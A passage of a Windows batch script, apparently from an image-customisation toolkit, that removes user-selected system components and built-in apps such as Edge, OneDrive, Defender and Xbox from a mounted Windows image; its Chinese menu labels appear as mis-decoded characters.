if "!Component!" equ "ZuneVideo" if "!ImageBuild!" equ "19041" call :RemoveWindowsComponent "Mount", "��Ӱ�͵���Ӧ��", "ZuneVideo"

if "!Component!" equ "InternetComponents" call :RemoveWindowsComponent "Mount", "Internet ���", "Internet"
if "!Component!" equ "MultimediaComponents" call :RemoveWindowsComponent "Mount", "ȫ����ý�����", "Multimedia"
if "!Component!" equ "PrivacyComponents" call :RemoveWindowsComponent "Mount", "ȫ����˽���", "Privacy"
if "!Component!" equ "RemotingComponents" call :RemoveWindowsComponent "Mount", "ȫ��Զ�̴������", "Remoting"
if "!Component!" equ "SystemComponents" call :RemoveWindowsComponent "Mount", "ȫ��ϵͳ���", "System"

if "!Component!" equ "SystemApps1" (
	if "!ImageFlag!" neq "Core" if "!ImageFlag!" neq "CoreN" if "!ImageFlag!" neq "CoreSingleEdition" call :RemoveWindowsComponent "Mount", "ָ����������Ӧ��", "AssignedAccessLockApp"
	call :RemoveWindowsComponent "Mount", "Azure Active Directory AppX ������", "AADBrokerPlugin"
	call :RemoveWindowsComponent "Mount", "����ע��Ӧ��", "BioEnrollment"
	call :RemoveWindowsComponent "Mount", "Camera Barcode Scanner", "CBSPreview"
	if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!ImageFlag!" neq "Core" if "!ImageFlag!" neq "CoreN" if "!ImageFlag!" neq "CoreSingleEdition" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "Connect Ӧ��", "PPIProjection"
	call :RemoveWindowsComponent "Mount", "Content Delivery Manager", "ContentDeliveryManager"
	if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "Cortana����ʼ�˵�����������Ӧ��", "Cortana"
	if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "Edge �����Ӧ��", "Edge"
	call :RemoveWindowsComponent "Mount", "Edge �����߹��߿ͻ���", "EdgeDevToolsClient"
	call :RemoveWindowsComponent "Mount", "Ŀ�ӿ���Ӧ��", "ECApp"
	call :RemoveWindowsComponent "Mount", "�ļ���Դ������Ӧ��", "FileExplorer"
	call :RemoveWindowsComponent "Mount", "����Ӧ��", "LockApp"
	call :RemoveWindowsComponent "Mount", "��ͼ�ؼ�", "MapControl"
	call :RemoveWindowsComponent "Mount", "Narrator QuickStart", "NarratorQuickStart"
	if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "OneDrive ����ͻ���", "OneDrive"
)

if "!Component!" equ "SystemApps2" (
	call :RemoveWindowsComponent "Mount", "�ҳ�����Ӧ��", "ParentalControls"
	call :RemoveWindowsComponent "Mount", "People Experience ����", "PeopleExperienceHost"
	call :RemoveWindowsComponent "Mount", "��������Ӧ��", "QuickAssist"
	call :RemoveWindowsComponent "Mount", "������ʾ����", "RetailDemoContent"
	call :RemoveWindowsComponent "Mount", "����ͬ��", "SettingSync"
	call :RemoveWindowsComponent "Mount", "Skype ORTC", "SkypeORTC"
	call :RemoveWindowsComponent "Mount", "SmartScreen Ӧ��", "SmartScreen"
	if "!ImageFlag!" neq "Core" if "!ImageFlag!" neq "CoreN" if "!ImageFlag!" neq "CoreSingleEdition" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "Take Test Ӧ��", "SecureAssessmentBrowser"
	call :RemoveWindowsComponent "Mount", "Win32 WebView ����", "Win32WebViewHost"
	call :RemoveWindowsComponent "Mount", "Windows Defender Ӧ��", "WindowsDefender"
	call :RemoveWindowsComponent "Mount", "Windows �����ʵ", "WindowsMixedReality"
	call :RemoveWindowsComponent "Mount", "Windows �Ķ��� [PDF]", "WindowsReaderPDF"
	call :RemoveWindowsComponent "Mount", "Xbox Game Callable UI", "XboxGameCallableUI"
)

if "!Component!" equ "WindowsApps1" (
	call :RemoveWindowsComponent "Mount", "Advertising Xaml", "AdvertisingXaml"
	call :RemoveWindowsComponent "Mount", "���Ӻ�ʱ��Ӧ��", "Alarms"
	call :RemoveWindowsComponent "Mount", "������Ӧ��", "Calculator"
	call :RemoveWindowsComponent "Mount", "���Ӧ��", "Camera"
	if "!ImageBuild!" equ "19041" call :RemoveWindowsComponent "Mount", "Cortana Ӧ��", "Cortana"
	call :RemoveWindowsComponent "Mount", "����Ӧ�ð�װ����", "DesktopAppInstaller"
	call :RemoveWindowsComponent "Mount", "��������Ӧ��", "FeedbackHub"
	if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "��Ӱ�͵���Ӧ��", "ZuneVideo"
	call :RemoveWindowsComponent "Mount", "��ȡ����Ӧ��", "GetHelp"
	call :RemoveWindowsComponent "Mount", "Google �� VP9 WebM ��Ƶ����������", "VP9VideoExtensions"
	call :RemoveWindowsComponent "Mount", "Groove ����Ӧ��", "ZuneMusic"
	call :RemoveWindowsComponent "Mount", "��Чͼ���ļ�����������", "HEIFImageExtension"
	call :RemoveWindowsComponent "Mount", "��ͼӦ��", "Maps"
	if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "��ϢӦ��", "Messaging"
	call :RemoveWindowsComponent "Mount", "Microsoft Pay Ӧ��", "WalletService"
	call :RemoveWindowsComponent "Mount", "�����ʵ�鿴��Ӧ��", "3DViewer"
	if "x!Bit!" equ "x64" call :RemoveWindowsComponent "Mount", "�����ʵ�Ż�Ӧ��", "MixedRealityPortal"
	if "!ImageBuild!" equ "19041" call :RemoveWindowsComponent "Mount", "��Ӱ�͵���Ӧ��", "ZuneVideo"
	if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "�ƶ��ײ�Ӧ��", "OneConnect"
)

if "!Component!" equ "WindowsApps2" (
	call :RemoveWindowsComponent "Mount", "�ҵ� Office Ӧ��", "OfficeHub"
	call :RemoveWindowsComponent "Mount", "OneNote Ӧ��", "OfficeOneNote"
	call :RemoveWindowsComponent "Mount", "��ͼ 3D Ӧ��", "Paint3D"
	call :RemoveWindowsComponent "Mount", "����Ӧ��", "People"
	call :RemoveWindowsComponent "Mount", "��ƬӦ��", "Photos"
	if "!ImageBuild!" leq "18363" call :RemoveWindowsComponent "Mount", "Print 3D Ӧ��", "Print3D"
	call :RemoveWindowsComponent "Mount", "��ͼ�Ͳ�ͼӦ��", "ScreenSketch"
	call :RemoveWindowsComponent "Mount", "Skype Ӧ��", "SkypeApp"
	call :RemoveWindowsComponent "Mount", "Solitaire Collection Ӧ��", "SolitaireCollection"
	call :RemoveWindowsComponent "Mount", "���Ӧ��", "StickyNotes"
	call :RemoveWindowsComponent "Mount", "ʹ�ü���Ӧ��", "Getstarted"
	call :RemoveWindowsComponent "Mount", "¼����Ӧ��", "SoundRecorder"
	call :RemoveWindowsComponent "Mount", "����Ӧ��", "BingWeather"
	call :RemoveWindowsComponent "Mount", "Web ý����չ���", "WebMediaExtensions"
	call :RemoveWindowsComponent "Mount", "Webp ͼ����չ���", "WebpImageExtensions"
	call :RemoveWindowsComponent "Mount", "Windows �ʼ�Ӧ��", "CommunicationsApps"
	call :RemoveWindowsComponent "Mount", "Windows Ӧ���̵�Ӧ��", "WindowsStore"
	call :RemoveWindowsComponent "Mount", "Xbox Ӧ��", "XboxApp"
	if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" call :RemoveWindowsComponent "Mount", "Xbox Identity Provider", "XboxIdentityProvider"
	call :RemoveWindowsComponent "Mount", "����ֻ�Ӧ��", "YourPhone"
)

if "!Component!" equ "MultimediaComponents" set "goto=:RemoveMenu"
if "!Component!" equ "PrivacyComponents" set "goto=:RemoveMenu"
if "!Component!" equ "RemotingComponents" set "goto=:RemoveMenu"
if "!Component!" equ "SystemComponents" set "goto=:RemoveMenu"
if "!Component!" equ "SystemApps1" set "goto=:RemoveSystemAppsMenu"
if "!Component!" equ "SystemApps2" set "goto=:RemoveSystemAppsMenu"
if "!Component!" equ "WindowsApps1" set "goto=:RemoveWindowsAppsMenu"
if "!Component!" equ "WindowsApps2" set "goto=:RemoveWindowsAppsMenu"
cls&echo.&echo.�Ƴ���ѡ��Ŀ����ɣ��밴���������...&pause>nul&set "Item="&set "Component="&goto !goto!

:RemoveWindowsComponent
cls&echo.&echo.�����Ƴ� %2 ���Ե�...
set "Item=�Ƴ� %2"
"!ToolsPath!\ToolKitHelper.exe" %1 %3
call :Log
goto :eof